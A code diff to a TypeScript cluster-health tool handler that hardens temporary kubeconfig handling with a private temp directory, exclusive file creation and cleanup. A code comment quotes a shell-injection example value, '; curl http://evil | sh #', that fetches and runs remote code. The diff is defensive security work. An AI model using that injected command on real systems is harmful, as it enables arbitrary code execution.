@@ -14,7 +14,7 @@ import { getDefaultModelId } from '@/lib/default-model'
 import { generateEmbedding, vectorSearch } from '@/lib/embeddings'
 import { exec } from 'child_process'
 import { promisify } from 'util'
-import { writeFileSync, unlinkSync } from 'fs'
+import { writeFileSync, unlinkSync, mkdtempSync, rmdirSync } from 'fs'
 import { tmpdir } from 'os'
 import { join } from 'path'
 import tls from 'tls'
@@ -1259,10 +1259,12 @@ async function handleClusterHealth(args: unknown, ctx: ToolExecutionContext): Pr
 
   for (const env of envs) {
     let kubeconfigPath: string | null = null
+    let kubeconfigTmpDir: string | null = null
     try {
       const decoded = Buffer.from(env.kubeconfig!, 'base64').toString('utf-8')
-      kubeconfigPath = join(tmpdir(), `orion-health-${env.id}.yaml`)
-      writeFileSync(kubeconfigPath, decoded, { mode: 0o600 })
+      kubeconfigTmpDir = mkdtempSync(join(tmpdir(), 'orion-health-'))
+      kubeconfigPath = join(kubeconfigTmpDir, 'kubeconfig.yaml')
+      writeFileSync(kubeconfigPath, decoded, { flag: 'wx', mode: 0o600 })
       // BLOCKER fix: `namespace` arg was interpolated into exec() template string → shell injection.
       // A namespace value like `; curl http://evil | sh #` ran arbitrary commands.
       // Switch to execFile (no shell) with args as an array.
@@ -1346,6 +1348,7 @@ async function handleClusterHealth(args: unknown, ctx: ToolExecutionContext): Pr
       errors.push(`${env.name}: ${e instanceof Error ? e.message : String(e)}`)
     } finally {
       if (kubeconfigPath) try { unlinkSync(kubeconfigPath) } catch { /* ignore */ }
+      if (kubeconfigTmpDir) try { rmdirSync(kubeconfigTmpDir) } catch { /* ignore */ }
     }
   }
 
